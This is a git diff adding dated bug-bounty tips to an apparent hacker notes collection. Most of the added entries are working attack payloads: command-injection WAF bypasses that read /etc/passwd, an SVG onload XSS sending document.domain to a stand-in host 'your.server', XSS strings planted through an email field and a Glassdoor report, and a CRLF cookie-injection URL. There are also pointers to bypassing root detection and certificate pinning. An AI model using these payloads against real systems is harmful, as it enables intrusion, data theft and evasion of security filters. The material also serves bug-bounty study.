@@ -56,3 +56,51 @@ Then
 Trusted signed binary will run the payload for you Smiling face with smiling eyes
 
 ***Source: https://twitter.com/smelly__vx/status/1379519938197655566?s=20***
+
+# 📅 08-Apr-2021
+## Facebook account takeover due to a wide platform bug in ajaxpipe responses
+- https://ysamm.com/?p=654
+
+## RCE WAF Bypass
+
+```sh
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+```
+
+# 📅 09-Apr-2021
+## Writing Network Templates with Nuclei
+- https://t.co/TiE9cg5p2K?amp=1
+
+## Cloudflare bypass all browsers.
+```js
+<svg/onload=location/**/='https://your.server/'+document.domain>
+```
+
+# 📅 12-Apr-2021
+## Bypassing root detection , certificate pinning using https://github.com/Ch0pin/medusa  anti_debug and unpinner modules 
+@Einstais @mobilesecurity_
+- https://twitter.com/Ch0pin/status/1381216805683924994?s=20
+
+## XSS Bypass Tip
+Hot XSS tip: did you know `window.alert?.()` and `(window?.alert)` will pop an alert? The ?. is a feature called optional chaining and as far as I can tell it's not in any popular XSS payload lists. Worth trying if you're looking for filter bypasses!
+![img](https://pbs.twimg.com/media/EygnbstWUAAodo0?format=png&name=small)
+
+## XSS Payload via email
+`hello"><img/src="x"onerror=alert(document.domain)>@mail.com`
+***source : https://hackerone.com/reports/1107726***
+
+### XSS on glassdoor
+```js
+"&gt;&lt;img+src+onerror=confirm&amp;#x00028;1&amp;#x00029;&gt;
+```
+***Source : https://hackerone.com/reports/789689***
+
+## CRLF Injection
+- https://hackerone.com/reports/1038594
+### Example
+```text
+https://www.abc.com/%0D%0ASet-Cookie:crlfinjection=crlfinjection
+```
